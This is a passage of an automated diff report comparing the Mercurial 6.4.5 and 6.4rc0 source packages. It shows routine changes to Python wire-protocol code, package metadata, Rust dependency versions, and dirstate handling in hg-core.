-        # If we're not actively running, close synchronously.
-        if not self._running:
-            fh.close()
-            return
+        The command is expected to return a stream.
 
-        self._queue.put(fh, block=True, timeout=None)
+        The stream may have been compressed in some implementations. This
+        function takes care of the decompression. This is the only difference
+        with _callstream.
 
+        returns the server reply as a file like object.
+        """
+        raise NotImplementedError()
 
-class checkambigatclosing(closewrapbase):
-    """Proxy for a file object, to avoid ambiguity of file stat
+    def _callpush(self, cmd, fp, **args):
+        """execute a <cmd> on server
 
-    See also util.filestat for detail about "ambiguity of file stat".
+        The command is expected to be related to a push. Push has a special
+        return method.
 
-    This proxy is useful only if the target file is guarded by any
-    lock (e.g. repo.lock or repo.wlock)
+        returns the server reply as a (ret, output) tuple. ret is either
+        empty (error) or a stringified int.
+        """
+        raise NotImplementedError()
 
-    Do not instantiate outside of the vfs layer.
-    """
+    def _calltwowaystream(self, cmd, fp, **args):
+        """execute <cmd> on server
 
-    def __init__(self, fh):
-        super(checkambigatclosing, self).__init__(fh)
-        object.__setattr__(self, '_oldstat', util.filestat.frompath(fh.name))
-
-    def _checkambig(self):
-        oldstat = self._oldstat
-        if oldstat.stat:
-            _avoidambig(self._origfh.name, oldstat)
-
-    def __exit__(self, exc_type, exc_value, exc_tb):
-        self._origfh.__exit__(exc_type, exc_value, exc_tb)
-        self._checkambig()
+        The command will send a stream to the server and get a stream in reply.
+        """
+        raise NotImplementedError()
 
-    def close(self):
-        self._origfh.close()
-        self._checkambig()
+    def _abort(self, exception):
+        """clearly abort the wire protocol connection and raise the exception"""
+        raise NotImplementedError()
```

### Comparing `mercurial-6.4.5/mercurial/win32.py` & `mercurial-6.4rc0/mercurial/win32.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/windows.py` & `mercurial-6.4rc0/mercurial/windows.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/wireprotoframing.py` & `mercurial-6.4rc0/mercurial/wireprotoframing.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/wireprotoserver.py` & `mercurial-6.4rc0/mercurial/wireprotoserver.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/wireprototypes.py` & `mercurial-6.4rc0/mercurial/wireprototypes.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/wireprotov1server.py` & `mercurial-6.4rc0/mercurial/wireprotov1server.py`

 * *Files 0% similar despite different names*

```diff
@@ -376,15 +376,15 @@
     def decodehexstring(s):
         return {binascii.unhexlify(h) for h in s.split(b';')}
 
     manifest = repo.vfs.tryread(b'pullbundles.manifest')
     if not manifest:
         return None
     res = bundlecaches.parseclonebundlesmanifest(repo, manifest)
-    res = bundlecaches.filterclonebundleentries(repo, res, pullbundles=True)
+    res = bundlecaches.filterclonebundleentries(repo, res)
     if not res:
         return None
     cl = repo.unfiltered().changelog
     heads_anc = cl.ancestors([cl.rev(rev) for rev in heads], inclusive=True)
     common_anc = cl.ancestors([cl.rev(rev) for rev in common], inclusive=True)
     compformats = clientcompressionsupport(proto)
     for entry in res:
```

### Comparing `mercurial-6.4.5/mercurial/worker.py` & `mercurial-6.4rc0/mercurial/worker.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial.egg-info/PKG-INFO` & `mercurial-6.4rc0/mercurial.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: mercurial
-Version: 6.4.5
+Version: 6.4rc0
 Summary: Fast scalable distributed SCM (revision control, version control) system
 Home-page: https://mercurial-scm.org/
 Download-URL: https://mercurial-scm.org/release/
 Author: Olivia Mackall and many others
 Author-email: mercurial@mercurial-scm.org
 License: GNU GPLv2 or any later version
 Classifier: Development Status :: 6 - Mature
```

### Comparing `mercurial-6.4.5/mercurial.egg-info/SOURCES.txt` & `mercurial-6.4rc0/mercurial.egg-info/SOURCES.txt`

 * *Files 0% similar despite different names*

```diff
@@ -1060,15 +1060,14 @@
 relnotes/5.7
 relnotes/5.8
 relnotes/5.9
 relnotes/6.0
 relnotes/6.1
 relnotes/6.2
 relnotes/6.3
-relnotes/6.4
 relnotes/next
 rust/Cargo.lock
 rust/Cargo.toml
 rust/README.rst
 rust/.cargo/config
 rust/chg/Cargo.lock
 rust/chg/Cargo.toml
@@ -1212,14 +1211,15 @@
 tests/fakepatchtime.py
 tests/filterpyflakes.py
 tests/filtertraceback.py
 tests/flagprocessorext.py
 tests/fsmonitor-run-tests.py
 tests/generate-working-copy-states.py
 tests/get-with-headers.py
+tests/helper-killhook.py
 tests/helper-runtests.sh
 tests/helpers-testrepo.sh
 tests/heredoctest.py
 tests/hghave
 tests/hghave.py
 tests/hgterm.ti
 tests/hgweberror.py
@@ -1464,15 +1464,14 @@
 tests/test-directaccess.t
 tests/test-dirs.py
 tests/test-dirstate-backup.t
 tests/test-dirstate-race.t
 tests/test-dirstate-race2.t
 tests/test-dirstate-read-race.t
 tests/test-dirstate-status-write-race.t
-tests/test-dirstate-version-fallback.t
 tests/test-dirstate.t
 tests/test-dispatch.py
 tests/test-dispatch.py.out
 tests/test-dispatch.t
 tests/test-docker-packaging.t
 tests/test-doctest.py
 tests/test-double-merge.t
@@ -1879,15 +1878,14 @@
 tests/test-pull-bundle.t
 tests/test-pull-http.t
 tests/test-pull-network.t
 tests/test-pull-permission.t
 tests/test-pull-pull-corruption.t
 tests/test-pull-r.t
 tests/test-pull-update.t
-tests/test-pullling-to-general-delta.t
 tests/test-purge-ignored-directory.t
 tests/test-purge.t
 tests/test-push-cgi.t
 tests/test-push-checkheads-multibranches-E1.t
 tests/test-push-checkheads-multibranches-E2.t
 tests/test-push-checkheads-multibranches-E3.t
 tests/test-push-checkheads-partial-C1.t
@@ -1932,15 +1930,14 @@
 tests/test-rebase-brute-force.t
 tests/test-rebase-cache.t
 tests/test-rebase-check-restore.t
 tests/test-rebase-collapse.t
 tests/test-rebase-conflicts.t
 tests/test-rebase-dest.t
 tests/test-rebase-detach.t
-tests/test-rebase-dry-run.t
 tests/test-rebase-empty-successor.t
 tests/test-rebase-emptycommit.t
 tests/test-rebase-inmemory.t
 tests/test-rebase-interruptions.t
 tests/test-rebase-issue-noparam-single-rev.t
 tests/test-rebase-legacy.t
 tests/test-rebase-mq-skip.t
@@ -2084,16 +2081,14 @@
 tests/test-ssh-repoerror.t
 tests/test-ssh.t
 tests/test-sshserver.py
 tests/test-stack.t
 tests/test-state-extension.t
 tests/test-static-http.t
 tests/test-status-color.t
-tests/test-status-committed-and-ignored.t
-tests/test-status-eacces.t
 tests/test-status-inprocess.py
 tests/test-status-inprocess.py.out
 tests/test-status-rev.t
 tests/test-status-terse.t
 tests/test-status-tracked-key.t
 tests/test-status.t
 tests/test-stdio.py
```

### Comparing `mercurial-6.4.5/relnotes/5.1` & `mercurial-6.4rc0/relnotes/5.1`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/5.2` & `mercurial-6.4rc0/relnotes/5.2`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/5.3` & `mercurial-6.4rc0/relnotes/5.3`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/5.4` & `mercurial-6.4rc0/relnotes/5.4`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/5.5` & `mercurial-6.4rc0/relnotes/5.5`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/5.6` & `mercurial-6.4rc0/relnotes/5.6`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/5.7` & `mercurial-6.4rc0/relnotes/5.7`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/5.8` & `mercurial-6.4rc0/relnotes/5.8`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/5.9` & `mercurial-6.4rc0/relnotes/5.9`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/6.0` & `mercurial-6.4rc0/relnotes/6.0`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/6.1` & `mercurial-6.4rc0/relnotes/6.1`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/6.2` & `mercurial-6.4rc0/relnotes/6.2`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/relnotes/6.3` & `mercurial-6.4rc0/relnotes/6.3`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/Cargo.lock` & `mercurial-6.4rc0/rust/Cargo.lock`

 * *Files 1% similar despite different names*

```diff
@@ -1019,27 +1019,27 @@
 checksum = "6f97cdb2a36ed4183de61b2f824cc45c9f1037f28afe0a322e9fff4c108b5aaa"
 dependencies = [
  "rand_core 0.6.4",
 ]
 
 [[package]]
 name = "rayon"
-version = "1.7.0"
+version = "1.6.1"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "1d2df5196e37bcc87abebc0053e20787d73847bb33134a69841207dd0a47f03b"
+checksum = "6db3a213adf02b3bcfd2d3846bb41cb22857d131789e01df434fb7e7bc0759b7"
 dependencies = [
  "either",
  "rayon-core",
 ]
 
 [[package]]
 name = "rayon-core"
-version = "1.11.0"
+version = "1.10.2"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "4b8f95bd6966f5c87776639160a66bd8ab9895d9d4ab01ddba9fc60661aebe8d"
+checksum = "356a0625f1954f730c0201cdab48611198dc6ce21f4acff55089b5a78e6e835b"
 dependencies = [
  "crossbeam-channel",
  "crossbeam-deque",
  "crossbeam-utils",
  "num_cpus",
 ]
 
@@ -1421,34 +1421,33 @@
 name = "yansi"
 version = "0.5.1"
 source = "registry+https://github.com/rust-lang/crates.io-index"
 checksum = "09041cd90cf85f7f8b2df60c646f853b7f535ce68f85244eb6731cf89fa498ec"
 
 [[package]]
 name = "zstd"
-version = "0.12.3+zstd.1.5.2"
+version = "0.11.2+zstd.1.5.2"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "76eea132fb024e0e13fd9c2f5d5d595d8a967aa72382ac2f9d39fcc95afd0806"
+checksum = "20cc960326ece64f010d2d2107537f26dc589a6573a316bd5b1dba685fa5fde4"
 dependencies = [
  "zstd-safe",
 ]
 
 [[package]]
 name = "zstd-safe"
-version = "6.0.4+zstd.1.5.4"
+version = "5.0.2+zstd.1.5.2"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "7afb4b54b8910cf5447638cb54bf4e8a65cbedd783af98b98c62ffe91f185543"
+checksum = "1d2a5585e04f9eea4b2a3d1eca508c4dee9592a89ef6f450c11719da0726f4db"
 dependencies = [
  "libc",
  "zstd-sys",
 ]
 
 [[package]]
 name = "zstd-sys"
-version = "2.0.7+zstd.1.5.4"
+version = "2.0.1+zstd.1.5.2"
 source = "registry+https://github.com/rust-lang/crates.io-index"
-checksum = "94509c3ba2fe55294d752b79842c530ccfab760192521df74a081a78d2b3c7f5"
+checksum = "9fd07cbbc53846d9145dbffdf6dd09a7a0aa52be46741825f5c97bdd4f73f12b"
 dependencies = [
  "cc",
  "libc",
- "pkg-config",
 ]
```

### Comparing `mercurial-6.4.5/rust/README.rst` & `mercurial-6.4rc0/rust/README.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/Cargo.lock` & `mercurial-6.4rc0/rust/chg/Cargo.lock`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/src/attachio.rs` & `mercurial-6.4rc0/rust/chg/src/attachio.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/src/clientext.rs` & `mercurial-6.4rc0/rust/chg/src/clientext.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/src/locator.rs` & `mercurial-6.4rc0/rust/chg/src/locator.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/src/main.rs` & `mercurial-6.4rc0/rust/chg/src/main.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/src/message.rs` & `mercurial-6.4rc0/rust/chg/src/message.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/src/procutil.rs` & `mercurial-6.4rc0/rust/chg/src/procutil.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/src/runcommand.rs` & `mercurial-6.4rc0/rust/chg/src/runcommand.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/src/sendfds.c` & `mercurial-6.4rc0/rust/chg/src/sendfds.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/src/sighandlers.c` & `mercurial-6.4rc0/rust/chg/src/sighandlers.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/chg/src/uihandler.rs` & `mercurial-6.4rc0/rust/chg/src/uihandler.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/Cargo.toml` & `mercurial-6.4rc0/rust/hg-core/Cargo.toml`

 * *Files 14% similar despite different names*

```diff
@@ -20,26 +20,28 @@
 lazy_static = "1.4.0"
 libc = "0.2.137"
 logging_timer = "1.1.0"
 ouroboros = "0.15.5"
 rand = "0.8.5"
 rand_pcg = "0.3.1"
 rand_distr = "0.4.3"
-rayon = "1.7.0"
+rayon = "1.6.1"
 regex = "1.7.0"
 sha-1 = "0.10.0"
 twox-hash = "1.6.3"
 same-file = "1.0.6"
 tempfile = "3.3.0"
 thread_local = "1.1.4"
 crossbeam-channel = "0.5.6"
 log = "0.4.17"
 memmap2 = { version = "0.5.8", features = ["stable_deref_trait"] }
-zstd = "0.12"
+zstd = "0.11.2"
 format-bytes = "0.3.0"
+# once_cell 1.15 uses edition 2021, while the heptapod CI
+# uses an old version of Cargo that doesn't support it.
 once_cell = "1.16.0"
 
 # We don't use the `miniz-oxide` backend to not change rhg benchmarks and until
 # we have a clearer view of which backend is the fastest.
 [dependencies.flate2]
 version = "1.0.24"
 features = ["zlib"]
```

### Comparing `mercurial-6.4.5/rust/hg-core/examples/nodemap/index.rs` & `mercurial-6.4rc0/rust/hg-core/examples/nodemap/index.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/examples/nodemap/main.rs` & `mercurial-6.4rc0/rust/hg-core/examples/nodemap/main.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/ancestors.rs` & `mercurial-6.4rc0/rust/hg-core/src/ancestors.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/checkexec.rs` & `mercurial-6.4rc0/rust/hg-core/src/checkexec.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/config/layer.rs` & `mercurial-6.4rc0/rust/hg-core/src/config/layer.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/config/mod.rs` & `mercurial-6.4rc0/rust/hg-core/src/config/mod.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/config/plain_info.rs` & `mercurial-6.4rc0/rust/hg-core/src/config/plain_info.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/config/values.rs` & `mercurial-6.4rc0/rust/hg-core/src/config/values.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/copy_tracing/tests.rs` & `mercurial-6.4rc0/rust/hg-core/src/copy_tracing/tests.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/copy_tracing/tests_support.rs` & `mercurial-6.4rc0/rust/hg-core/src/copy_tracing/tests_support.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/copy_tracing.rs` & `mercurial-6.4rc0/rust/hg-core/src/copy_tracing.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/dagops.rs` & `mercurial-6.4rc0/rust/hg-core/src/dagops.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/dirstate/dirs_multiset.rs` & `mercurial-6.4rc0/rust/hg-core/src/dirstate/dirs_multiset.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/dirstate/entry.rs` & `mercurial-6.4rc0/rust/hg-core/src/dirstate/entry.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/dirstate/parsers.rs` & `mercurial-6.4rc0/rust/hg-core/src/dirstate/parsers.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/dirstate/status.rs` & `mercurial-6.4rc0/rust/hg-core/src/dirstate/status.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/dirstate.rs` & `mercurial-6.4rc0/rust/hg-core/src/dirstate.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/dirstate_tree/dirstate_map.rs` & `mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/dirstate_map.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/dirstate_tree/on_disk.rs` & `mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/on_disk.rs`

 * *Files 1% similar despite different names*

```diff
@@ -411,17 +411,17 @@
         } else {
             Ok(None)
         }
     }
 
     fn synthesize_unix_mode(&self) -> u32 {
         let file_type = if self.flags().contains(Flags::MODE_IS_SYMLINK) {
-            libc::S_IFLNK as u32
+            libc::S_IFLNK
         } else {
-            libc::S_IFREG as u32
+            libc::S_IFREG
         };
         let permissions = if self.flags().contains(Flags::MODE_EXEC_PERM) {
             0o755
         } else {
             0o644
         };
         file_type | permissions
```

### Comparing `mercurial-6.4.5/rust/hg-core/src/dirstate_tree/owning.rs` & `mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/owning.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/dirstate_tree/path_with_basename.rs` & `mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/path_with_basename.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/dirstate_tree/status.rs` & `mercurial-6.4rc0/rust/hg-core/src/dirstate_tree/status.rs`

 * *Files 2% similar despite different names*

```diff
@@ -43,18 +43,24 @@
     dmap: &'dirstate mut DirstateMap,
     matcher: &(dyn Matcher + Sync),
     root_dir: PathBuf,
     ignore_files: Vec<PathBuf>,
     options: StatusOptions,
 ) -> Result<(DirstateStatus<'dirstate>, Vec<PatternFileWarning>), StatusError>
 {
-    // Also cap for a Python caller of this function, but don't complain if
-    // the global threadpool has already been set since this code path is also
-    // being used by `rhg`, which calls this early.
-    let _ = crate::utils::cap_default_rayon_threads();
+    // Force the global rayon threadpool to not exceed 16 concurrent threads.
+    // This is a stop-gap measure until we figure out why using more than 16
+    // threads makes `status` slower for each additional thread.
+    // We use `ok()` in case the global threadpool has already been
+    // instantiated in `rhg` or some other caller.
+    // TODO find the underlying cause and fix it, then remove this.
+    rayon::ThreadPoolBuilder::new()
+        .num_threads(16.min(rayon::current_num_threads()))
+        .build_global()
+        .ok();
 
     let (ignore_fn, warnings, patterns_changed): (IgnoreFnType, _, _) =
         if options.list_ignored || options.list_unknown {
             let (ignore_fn, warnings, changed) = match dmap.dirstate_version {
                 DirstateVersion::V1 => {
                     let (ignore_fn, warnings) = get_ignore_function(
                         ignore_files,
@@ -234,15 +240,15 @@
         }
     }
 
     fn force<'b>(&self, ignore_fn: &IgnoreFnType<'b>) -> bool {
         match self.parent {
             None => false,
             Some(parent) => {
-                *(self.cache.get_or_init(|| {
+                *(parent.cache.get_or_init(|| {
                     parent.force(ignore_fn) || ignore_fn(self.path)
                 }))
             }
         }
     }
 }
 
@@ -423,29 +429,24 @@
 
             // We dont know, so conservatively say this isnt the case
             let children_all_have_dirstate_node_or_are_ignored = false;
 
             return Ok(children_all_have_dirstate_node_or_are_ignored);
         }
 
-        let readdir_succeeded;
         let mut fs_entries = if let Ok(entries) = self.read_dir(
             directory_hg_path,
             &directory_entry.fs_path,
             is_at_repo_root,
         ) {
-            readdir_succeeded = true;
             entries
         } else {
             // Treat an unreadable directory (typically because of insufficient
             // permissions) like an empty directory. `self.read_dir` has
             // already called `self.io_error` so a warning will be emitted.
-            // We still need to remember that there was an error so that we
-            // know not to cache this result.
-            readdir_succeeded = false;
             Vec::new()
         };
 
         // `merge_join_by` requires both its input iterators to be sorted:
 
         let dirstate_nodes = dirstate_nodes.sorted();
         // `sort_unstable_by_key` doesnt allow keys borrowing from the value:
@@ -490,15 +491,14 @@
                     directory_hg_path,
                     fs_entry,
                 ),
             };
             Ok(has_dirstate_node_or_is_ignored)
         })
         .try_reduce(|| true, |a, b| Ok(a && b))
-        .map(|res| res && readdir_succeeded)
     }
 
     fn traverse_fs_and_dirstate<'ancestor>(
         &self,
         fs_entry: &DirEntry,
         dirstate_node: NodeRef<'tree, 'on_disk>,
         has_ignored_ancestor: &'ancestor HasIgnoredAncestor<'ancestor>,
```

### Comparing `mercurial-6.4.5/rust/hg-core/src/discovery.rs` & `mercurial-6.4rc0/rust/hg-core/src/discovery.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/errors.rs` & `mercurial-6.4rc0/rust/hg-core/src/errors.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/exit_codes.rs` & `mercurial-6.4rc0/rust/hg-core/src/exit_codes.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/filepatterns.rs` & `mercurial-6.4rc0/rust/hg-core/src/filepatterns.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/lib.rs` & `mercurial-6.4rc0/rust/hg-core/src/lib.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/lock.rs` & `mercurial-6.4rc0/rust/hg-core/src/lock.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/logging.rs` & `mercurial-6.4rc0/rust/hg-core/src/logging.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/matchers.rs` & `mercurial-6.4rc0/rust/hg-core/src/matchers.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/narrow.rs` & `mercurial-6.4rc0/rust/hg-core/src/narrow.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/operations/cat.rs` & `mercurial-6.4rc0/rust/hg-core/src/operations/cat.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/operations/debugdata.rs` & `mercurial-6.4rc0/rust/hg-core/src/operations/debugdata.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/operations/list_tracked_files.rs` & `mercurial-6.4rc0/rust/hg-core/src/operations/list_tracked_files.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/repo.rs` & `mercurial-6.4rc0/rust/hg-core/src/repo.rs`

 * *Files 3% similar despite different names*

```diff
@@ -228,25 +228,15 @@
     pub fn try_with_wlock_no_wait<R>(
         &self,
         f: impl FnOnce() -> R,
     ) -> Result<R, LockError> {
         try_with_lock_no_wait(self.hg_vfs(), "wlock", f)
     }
 
-    /// Whether this repo should use dirstate-v2.
-    /// The presence of `dirstate-v2` in the requirements does not mean that
-    /// the on-disk dirstate is necessarily in version 2. In most cases,
-    /// a dirstate-v2 file will indeed be found, but in rare cases (like the
-    /// upgrade mechanism being cut short), the on-disk version will be a
-    /// v1 file.
-    /// Semantically, having a requirement only means that a client cannot
-    /// properly understand or properly update the repo if it lacks the support
-    /// for the required feature, but not that that feature is actually used
-    /// in all occasions.
-    pub fn use_dirstate_v2(&self) -> bool {
+    pub fn has_dirstate_v2(&self) -> bool {
         self.requirements
             .contains(requirements::DIRSTATE_V2_REQUIREMENT)
     }
 
     pub fn has_sparse(&self) -> bool {
         self.requirements.contains(requirements::SPARSE_REQUIREMENT)
     }
@@ -283,29 +273,18 @@
             .get_or_init(|| self.read_dirstate_parents())?)
     }
 
     fn read_dirstate_parents(&self) -> Result<DirstateParents, HgError> {
         let dirstate = self.dirstate_file_contents()?;
         let parents = if dirstate.is_empty() {
             DirstateParents::NULL
-        } else if self.use_dirstate_v2() {
-            let docket_res =
-                crate::dirstate_tree::on_disk::read_docket(&dirstate);
-            match docket_res {
-                Ok(docket) => docket.parents(),
-                Err(_) => {
-                    log::info!(
-                        "Parsing dirstate docket failed, \
-                        falling back to dirstate-v1"
-                    );
-                    *crate::dirstate::parsers::parse_dirstate_parents(
-                        &dirstate,
-                    )?
-                }
-            }
+        } else if self.has_dirstate_v2() {
+            let docket =
+                crate::dirstate_tree::on_disk::read_docket(&dirstate)?;
+            docket.parents()
         } else {
             *crate::dirstate::parsers::parse_dirstate_parents(&dirstate)?
         };
         self.dirstate_parents.set(parents);
         Ok(parents)
     }
 
@@ -313,55 +292,35 @@
     /// check if the data file has been updated/deleted by another process
     /// since we last read the dirstate.
     /// Namely, the inode, data file uuid and the data size.
     fn get_dirstate_data_file_integrity(
         &self,
     ) -> Result<DirstateMapIdentity, HgError> {
         assert!(
-            self.use_dirstate_v2(),
+            self.has_dirstate_v2(),
             "accessing dirstate data file ID without dirstate-v2"
         );
         // Get the identity before the contents since we could have a race
         // between the two. Having an identity that is too old is fine, but
         // one that is younger than the content change is bad.
         let identity = self.dirstate_identity()?;
         let dirstate = self.dirstate_file_contents()?;
         if dirstate.is_empty() {
             self.dirstate_parents.set(DirstateParents::NULL);
             Ok((identity, None, 0))
         } else {
-            let docket_res =
-                crate::dirstate_tree::on_disk::read_docket(&dirstate);
-            match docket_res {
-                Ok(docket) => {
-                    self.dirstate_parents.set(docket.parents());
-                    Ok((
-                        identity,
-                        Some(docket.uuid.to_owned()),
-                        docket.data_size(),
-                    ))
-                }
-                Err(_) => {
-                    log::info!(
-                        "Parsing dirstate docket failed, \
-                        falling back to dirstate-v1"
-                    );
-                    let parents =
-                        *crate::dirstate::parsers::parse_dirstate_parents(
-                            &dirstate,
-                        )?;
-                    self.dirstate_parents.set(parents);
-                    Ok((identity, None, 0))
-                }
-            }
+            let docket =
+                crate::dirstate_tree::on_disk::read_docket(&dirstate)?;
+            self.dirstate_parents.set(docket.parents());
+            Ok((identity, Some(docket.uuid.to_owned()), docket.data_size()))
         }
     }
 
     fn new_dirstate_map(&self) -> Result<OwningDirstateMap, DirstateError> {
-        if self.use_dirstate_v2() {
+        if self.has_dirstate_v2() {
             // The v2 dirstate is split into a docket and a data file.
             // Since we don't always take the `wlock` to read it
             // (like in `hg status`), it is susceptible to races.
             // A simple retry method should be enough since full rewrites
             // only happen when too much garbage data is present and
             // this race is unlikely.
             let mut tries = 0;
@@ -380,47 +339,42 @@
                                 "dirstate read race detected {} (retry {}/{})",
                                 context,
                                 tries,
                                 V2_MAX_READ_ATTEMPTS,
                             );
                             continue;
                         }
-                        _ => {
-                            log::info!(
-                                "Reading dirstate v2 failed, \
-                                falling back to v1"
-                            );
-                            return self.new_dirstate_map_v1();
-                        }
+                        _ => return Err(e),
                     },
                 }
             }
             let error = HgError::abort(
                 format!("dirstate read race happened {tries} times in a row"),
                 255,
                 None,
             );
             Err(DirstateError::Common(error))
         } else {
-            self.new_dirstate_map_v1()
-        }
-    }
-
-    fn new_dirstate_map_v1(&self) -> Result<OwningDirstateMap, DirstateError> {
-        debug_wait_for_file_or_print(self.config(), "dirstate.pre-read-file");
-        let identity = self.dirstate_identity()?;
-        let dirstate_file_contents = self.dirstate_file_contents()?;
-        if dirstate_file_contents.is_empty() {
-            self.dirstate_parents.set(DirstateParents::NULL);
-            Ok(OwningDirstateMap::new_empty(Vec::new()))
-        } else {
-            let (map, parents) =
-                OwningDirstateMap::new_v1(dirstate_file_contents, identity)?;
-            self.dirstate_parents.set(parents);
-            Ok(map)
+            debug_wait_for_file_or_print(
+                self.config(),
+                "dirstate.pre-read-file",
+            );
+            let identity = self.dirstate_identity()?;
+            let dirstate_file_contents = self.dirstate_file_contents()?;
+            if dirstate_file_contents.is_empty() {
+                self.dirstate_parents.set(DirstateParents::NULL);
+                Ok(OwningDirstateMap::new_empty(Vec::new()))
+            } else {
+                let (map, parents) = OwningDirstateMap::new_v1(
+                    dirstate_file_contents,
+                    identity,
+                )?;
+                self.dirstate_parents.set(parents);
+                Ok(map)
+            }
         }
     }
 
     fn read_docket_and_data_file(
         &self,
     ) -> Result<OwningDirstateMap, DirstateError> {
         debug_wait_for_file_or_print(self.config(), "dirstate.pre-read-file");
@@ -592,15 +546,15 @@
     /// TODO: have a `WritableRepo` type only accessible while holding the
     /// lock?
     pub fn write_dirstate(&self) -> Result<(), DirstateError> {
         let map = self.dirstate_map()?;
         // TODO: Maintain a `DirstateMap::dirty` flag, and return early here if
         // its unset
         let parents = self.dirstate_parents()?;
-        let (packed_dirstate, old_uuid_to_remove) = if self.use_dirstate_v2() {
+        let (packed_dirstate, old_uuid_to_remove) = if self.has_dirstate_v2() {
             let (identity, uuid, data_size) =
                 self.get_dirstate_data_file_integrity()?;
             let identity_changed = identity != map.old_identity();
             let uuid_changed = uuid.as_deref() != map.old_uuid();
             let data_length_changed = data_size != map.old_data_size();
 
             if identity_changed || uuid_changed || data_length_changed {
```

### Comparing `mercurial-6.4.5/rust/hg-core/src/requirements.rs` & `mercurial-6.4rc0/rust/hg-core/src/requirements.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/rust/hg-core/src/revlog/changelog.rs` & `mercurial-6.4rc0/rust/hg-core/src/revlog/changelog.rs`

 * *Files identical despite different names*

